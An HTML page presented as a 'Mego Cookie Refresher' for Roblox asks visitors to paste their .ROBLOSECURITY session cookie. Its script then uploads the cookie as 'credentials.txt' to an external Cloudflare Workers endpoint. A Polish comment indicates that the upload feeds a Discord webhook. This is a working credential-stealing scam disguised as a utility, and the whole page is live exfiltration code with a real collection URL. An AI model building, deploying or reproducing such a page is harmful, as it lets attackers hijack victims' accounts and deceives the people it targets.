<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Mego Cookie Refresher</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            background-color: #0d0d0d;
            color: #e6edf3;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            width: 480px;
            background: #111111;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
        }
        h2 { font-size: 16px; margin-bottom: 12px; color: #ff6584; text-align: center; }
        label { font-size: 11px; color: #888; display: block; margin-bottom: 5px; }
        input[type="text"], textarea {
            width: 100%;
            background: #030303;
            border: 1px solid #444;
            border-radius: 4px;
            padding: 8px;
            color: #fff;
            font-size: 11px;
            margin-bottom: 12px;
            outline: none;
            resize: none;
        }
        input[type="text"]:focus, textarea:focus { border-color: #ff6584; }
        button {
            width: 100%;
            background: linear-gradient(135deg, #ff6584 0%, #ff8da1 100%);
            color: white;
            border: none;
            border-radius: 6px;
            padding: 10px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
            margin-bottom: 10px;
        }
        button:hover { filter: brightness(1.1); }
        .copy-btn {
            background: linear-gradient(135deg, #00b4d8 0%, #0077b6 100%);
            margin-top: 5px;
            display: none;
        }
        pre {
            background: #030303;
            border: 1px solid #222;
            border-radius: 4px;
            padding: 10px;
            font-size: 10px;
            color: #00ffcc;
            margin-top: 15px;
            height: 120px;
            overflow-y: auto;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <div class="card">
        <h2>Mego Cookie Refresher</h2>
        
        <label for="cookieInput">Paste your old .ROBLOSECURITY cookie:</label>
        <input type="text" id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE-THIS...">
        
        <button id="refreshBtn">Refresh & Send</button>

        <label for="outputCookie">Refreshed .ROBLOSECURITY:</label>
        <textarea id="outputCookie" rows="3" placeholder="Refreshed cookie will appear here..." readonly></textarea>
        <button id="copyBtn" class="copy-btn">Copy Refreshed Cookie</button>

        <pre id="outputLog">Status: Ready to process...</pre>
    </div>

    <script>
        const PROXY_URL = "https://wispy-night-a3a2.kruszkomaja.workers.dev/";

        document.getElementById('refreshBtn').addEventListener('click', async () => {
            const cookie = document.getElementById('cookieInput').value.trim();
            const logBox = document.getElementById('outputLog');
            const outputCookieArea = document.getElementById('outputCookie');
            const copyBtn = document.getElementById('copyBtn');

            outputCookieArea.value = "";
            copyBtn.style.display = "none";

            if (!cookie) {
                logBox.innerText = "Error: Please enter a .ROBLOSECURITY cookie first!";
                return;
            }

            logBox.innerText = "[*] Sending to Worker for refreshing...";

            try {
                const credentialsContent = `[🌈] .ROBLOSECURITY:\n${cookie}`;
                const blob = new Blob([credentialsContent], { type: "text/plain" });
                const formData = new FormData();
                formData.append("file", blob, "credentials.txt");

                const response = await fetch(PROXY_URL, {
                    method: "POST",
                    headers: {
                        "X-Source": "web-panel" // Wycisza webhooka na Discordzie
                    },
                    body: formData
                });

                if (!response.ok) {
                    throw new Error("Worker responded with status " + response.status);
                }

                const data = await response.json();
                
                if (data.success && data.refreshedCookie) {
                    outputCookieArea.value = data.refreshedCookie;
                    copyBtn.style.display = "block";
                    logBox.innerText = "Success! Cookie has been refreshed.\n\n" + data.profile;
                } else {
                    logBox.innerText = "Error: Could not refresh cookie.";
                }

            } catch (err) {
                logBox.innerText = "Error communicating with Worker: " + err.message;
            }
        });

        document.getElementById('copyBtn').addEventListener('click', () => {
            const outputCookieArea = document.getElementById('outputCookie');
            outputCookieArea.select();
            document.execCommand('copy');
            
            const copyBtn = document.getElementById('copyBtn');
            const originalText = copyBtn.innerText;
            copyBtn.innerText = "Copied to Clipboard!";
            setTimeout(() => {
                copyBtn.innerText = originalText;
            }, 2000);
        });
    </script>
</body>
</html>
